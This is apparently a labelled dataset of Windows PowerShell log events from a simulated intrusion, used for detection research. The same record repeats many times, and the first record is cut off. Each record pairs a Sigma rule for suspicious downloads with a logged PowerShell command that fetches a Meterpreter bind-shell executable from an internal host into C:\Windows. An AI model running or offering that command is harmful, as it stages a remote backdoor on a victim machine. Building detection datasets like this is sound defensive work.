System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
